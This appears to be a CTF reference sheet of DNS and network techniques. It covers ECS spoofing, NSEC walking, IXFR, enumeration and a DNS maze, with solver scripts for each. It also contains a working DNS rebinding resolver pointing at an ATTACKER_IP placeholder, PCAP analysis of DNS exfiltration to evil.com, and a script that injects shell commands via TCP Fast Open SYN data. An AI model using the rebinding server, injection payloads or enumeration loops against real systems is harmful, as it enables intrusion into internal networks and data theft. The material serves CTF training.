# CTF Misc - DNS Exploitation Techniques

## Table of Contents
- [EDNS Client Subnet (ECS) Spoofing](#edns-client-subnet-ecs-spoofing)
- [DNSSEC NSEC Walking](#dnssec-nsec-walking)
- [Incremental Zone Transfer (IXFR)](#incremental-zone-transfer-ixfr)
- [DNS Rebinding](#dns-rebinding)
- [DNS Tunneling / Exfiltration](#dns-tunneling--exfiltration)
- [DNS Enumeration Quick Reference](#dns-enumeration-quick-reference)
- [DNS Round-Robin A Record Enumeration (EKOPARTY 2017)](#dns-round-robin-a-record-enumeration-ekoparty-2017)
- [DNS Maze Traversal (hxp CTF 2017)](#dns-maze-traversal-hxp-ctf-2017)
- [TCP Fast Open SYN-Payload Command Injection (Insomnihack 2019)](#tcp-fast-open-syn-payload-command-injection-insomnihack-2019)

---

## EDNS Client Subnet (ECS) Spoofing
**Pattern (DragoNflieS, Nullcon 2026):** DNS server returns different records based on client IP. Spoof source using ECS option.

```bash
# dig with ECS option
dig @52.59.124.14 -p 5053 flag.example.com TXT +subnet=10.13.37.1/24
```

```python
import dns.edns, dns.query, dns.message

q = dns.message.make_query("flag.example.com", "TXT", use_edns=True)
ecs = dns.edns.ECSOption("10.13.37.1", 24, 0)  # Internal network subnet
q.use_edns(0, 0, 8192, options=[ecs])
r = dns.query.udp(q, "target_ip", port=5053, timeout=1.5)
for rrset in r.answer:
    for rd in rrset:
        print(b"".join(rd.strings).decode())
```

**Key insight:** Try leet-speak subnets like `10.13.37.0/24` (1337), common internal ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).

## DNSSEC NSEC Walking
**Pattern (DiNoS, Nullcon 2026):** NSEC records in DNSSEC zones reveal all domain names by chaining to the next name.

```python
import subprocess, re

def walk_nsec(server, port, base_domain):
    """Walk NSEC chain to enumerate entire zone."""
    current = base_domain
    visited = set()
    records = []
    while current not in visited:
        visited.add(current)
        out = subprocess.check_output(
            ["dig", f"@{server}", "-p", str(port), "ANY", current, "+dnssec"],
            text=True)
        # Extract TXT records
        for m in re.finditer(r'TXT\s+"([^"]*)"', out):
            records.append((current, m.group(1)))
        # Follow NSEC chain
        m = re.search(r'NSEC\s+(\S+)', out)
        if m:
            current = m.group(1).rstrip('.')
        else:
            break
    return records
```

## Incremental Zone Transfer (IXFR)
**Pattern (Zoney, Nullcon 2026):** When AXFR is blocked, IXFR from old serial reveals zone update history including deleted records.

```bash
# AXFR blocked? Try IXFR from serial 0
dig @server -p 5054 flag.example.com IXFR=0
# Look for historical TXT records in the diff output
```

**IXFR output format:** The diff shows pairs of SOA records bracketing additions/deletions. Records between the old SOA and new SOA were removed; records after new SOA were added. Deleted TXT records often contain flag fragments.

---

## DNS Rebinding

**Pattern:** Bypass same-origin or IP-based access controls by making a DNS name resolve to different IPs over time.

**How it works:**
1. Attacker controls DNS for `evil.com` with very low TTL (e.g., 1 second)
2. First resolution: `evil.com` -> attacker's IP (serves malicious JS)
3. Second resolution: `evil.com` -> `127.0.0.1` (or internal IP)
4. Browser's same-origin policy allows JS on `evil.com` to access the new IP

```python
# Simple DNS rebinding server (Python + dnslib)
from dnslib import DNSRecord, RR, A
from dnslib.server import DNSServer, BaseResolver

class RebindResolver(BaseResolver):
    def __init__(self):
        self.count = {}

    def resolve(self, request, handler):
        qname = str(request.q.qname)
        self.count[qname] = self.count.get(qname, 0) + 1
        reply = request.reply()

        if self.count[qname] % 2 == 1:
            reply.add_answer(RR(qname, rdata=A("ATTACKER_IP"), ttl=1))
        else:
            reply.add_answer(RR(qname, rdata=A("127.0.0.1"), ttl=1))
        return reply
```

**Tools:** [rbndr.us](http://rbndr.us/) for quick rebinding without custom DNS, [singularity](https://github.com/nccgroup/singularity) for automated attacks.

---

## DNS Tunneling / Exfiltration

**Pattern:** Data exfiltrated via DNS queries (subdomains) or responses (TXT records).

**Detection in PCAPs:**
```bash
# Extract DNS queries from pcap
tshark -r capture.pcap -Y "dns.qry.type == 1" \
    -T fields -e dns.qry.name | sort -u

# Look for encoded subdomains (hex, base32, base64url)
tshark -r capture.pcap -Y "dns.qry.name contains '.evil.com'" \
    -T fields -e dns.qry.name
```

**Decoding exfiltrated data:**
```python
import base64

# Subdomain-based exfil: data.chunk1.evil.com, data.chunk2.evil.com
queries = [...]  # extracted DNS query names
chunks = [q.split('.')[0] for q in queries if q.endswith('.evil.com')]
decoded = base64.b32decode(''.join(chunks).upper() + '====')
print(decoded)
```

**DNS-based C2 in PCAPs:**
```bash
tshark -r capture.pcap -Y "dns.qry.type == 16" \
    -T fields -e dns.qry.name -e dns.txt
```

---

## DNS Round-Robin A Record Enumeration (EKOPARTY 2017)

**Pattern:** Domain configured with many rotating A records pointing to different backend IPs. Only some serve the relevant HTTP content. Query repeatedly to collect all IPs, then scan and make direct virtual-host requests.

```bash
# Get all A records (query multiple times for round-robin)
for i in $(seq 1 100); do dig +short target.com A; done | sort -u > ips.txt

# Scan each IP for open port 80 and request with correct Host header
while read ip; do
    response=$(curl -s -m 3 -H "Host: target.com" "http://$ip/")
    if echo "$response" | grep -q "flag"; then
        echo "Found on $ip"
        echo "$response"
    fi
done < ips.txt
```

**Key insight:** DNS round-robin with heterogeneous backends can hide content across many IPs. A single DNS query may not return all records — query repeatedly (50-100 times) and deduplicate to exhaust the record set. Then make direct virtual-host requests (`-H "Host: target.com"`) to each IP for complete coverage.

---

## DNS Maze Traversal (hxp CTF 2017)

A maze encoded as DNS records: each UUID subdomain is a position, `dig -t txt` gives hints, CNAME records for directional subdomains give neighboring positions:

```python
import dns.resolver
def get_neighbors(uuid, domain):
    neighbors = {}
    for direction in ['up', 'down', 'left', 'right']:
        try:
            answer = dns.resolver.resolve(f'{direction}.{uuid}.{domain}', 'CNAME')
            neighbors[direction] = str(answer[0]).split('.')[0]
        except: pass
    return neighbors

# BFS to find exit
from collections import deque
queue = deque([(start_uuid, [start_uuid])])
visited = {start_uuid}
while queue:
    current, path = queue.popleft()
    txt = dns.resolver.resolve(f'{current}.{domain}', 'TXT')
    if 'flag' in str(txt[0]):
        print(f"Found flag at {current}: {txt[0]}")
        break
    for direction, next_uuid in get_neighbors(current, domain).items():
        if next_uuid not in visited:
            visited.add(next_uuid)
            queue.append((next_uuid, path + [next_uuid]))
```

**Key insight:** DNS records can encode arbitrary graph structures. Each node is a subdomain (UUID), edges are CNAME records at directional subdomains (up/down/left/right.UUID.domain), and node data is in TXT records. Standard graph search (BFS/DFS) solves these. Cache aggressively — DNS round-trip times dominate runtime. Use `dns.resolver` (dnspython) rather than subprocess `dig` calls for performance.

---

## DNS Enumeration Quick Reference

```bash
# Standard zone transfer attempt
dig @ns.target.com target.com AXFR

# Brute-force subdomains
for sub in $(cat wordlist.txt); do
    dig +short "$sub.target.com" && echo "$sub"
done

# Reverse DNS sweep
for i in $(seq 1 254); do
    dig +short -x 10.0.0.$i
done

# Check for wildcard DNS
dig randomnonexistent.target.com
```

---

## TCP Fast Open SYN-Payload Command Injection (Insomnihack 2019)

**Pattern:** A service uses TCP Fast Open (RFC 7413) and processes up to ~1460 bytes of *data carried in the initial SYN packet*, before the three-way handshake completes. If the handler passes those bytes to a command interpreter, you can invoke commands without ever establishing a full connection — ports that appear closed/filtered to standard TCP scans respond only to SYN+data. A common CTF hint for this technique is any mention of "RFC 741x", "fast open", or "knock with data".

```python
# Linux kernel: enable client-side TFO: sysctl -w net.ipv4.tcp_fastopen=5
# Python sockets support TFO via MSG_FASTOPEN on the first sendto().
import socket
MSG_FASTOPEN = 0x20000000

def tfo_send(host, port, payload: bytes, timeout=3.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.sendto(payload, MSG_FASTOPEN, (host, port))
    try:
        return s.recv(65536)
    finally:
        s.close()

# Scapy variant: raw SYN with payload (no kernel TFO cookie needed for testing)
# from scapy.all import IP, TCP, send
# send(IP(dst=host)/TCP(dport=port, flags='S', seq=1)/b'SyN ls -la')

print(tfo_send('10.13.37.99', 3737, b'SyN cat ./secret/me/not/flag.txt'))
```

**Key insight:** Classic port scans (`nmap -sS`, `nc -vz`) don't carry SYN data, so TFO-only services look silent. When a challenge hints at RFC 7413 or "knock with data", send the payload *inside* the SYN (either via `MSG_FASTOPEN` or a crafted Scapy packet) and watch for a response. The prefix ("SyN" here) is often the service's auth token since it's visible in the first 3-4 bytes of any sniffed SYN.

**References:** Insomnihack 2019 — Net1, writeups 13988, 13989, 13990
